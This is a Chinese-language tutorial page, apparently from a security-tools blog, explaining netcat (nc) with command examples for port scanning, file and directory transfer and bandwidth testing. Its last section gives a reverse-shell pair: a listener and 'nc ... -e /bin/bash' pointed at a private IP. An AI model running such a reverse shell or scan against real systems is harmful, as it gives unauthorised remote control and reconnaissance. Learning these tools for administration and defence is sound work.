---
# 这是页面的图标
icon: bit
# 这是文章的标题
title: nc
# 设置作者
author: lhz
# 设置写作时间
time: 2018-10-01
# 一个页面只能有一个分类
category: 安全工具
# 一个页面可以有多个标签
tag:
  - 安全工具
  - nc

comment: false
typora-root-url: ..\..\..\.vuepress\public

---

## nc

nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具

### 作用

（1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口

（2）端口的扫描，nc可以作为client发起TCP或UDP连接

（3）机器之间传输文件

（4）机器之间网络测速   

### 参数

![image-20210915180906011](/assets/img/image-20210915180906011.png)

### 用法

- 网络连通性测试和端口扫描

  ```
  nc -v -z -w2 192.168.0.3 1-100  //tcp
  nc -u -z -w2 192.168.0.1 1-1000 //udp
  ```

- 使用nc传输文件和目录

  ```
  传输文件：
      接收：
      	nc -l 9995 >zabbix.rpm
      发送：
     	 	nc 10.0.1.162 9995 < zabbix-release-2.4-1.el6.noarch.rpm
  传输目录：
  	接收：
  		nc -l 9995 | tar xfvz -
      发送：
      	tar cfz - * | nc 10.0.1.162 9995
  ```

- 测试网速

  ```
  接收：
  	nc -l 9991 >/dev/null
  发送：
  	nc 10.0.1.161 9991 </dev/zero
  查看网速：
  	dstat
  ```

- 回弹shell

  ```
  监听
  nc -lvp 4444
  回弹
  nc -nv 192.168.141.134 4444 -e /bin/bash
  ```

  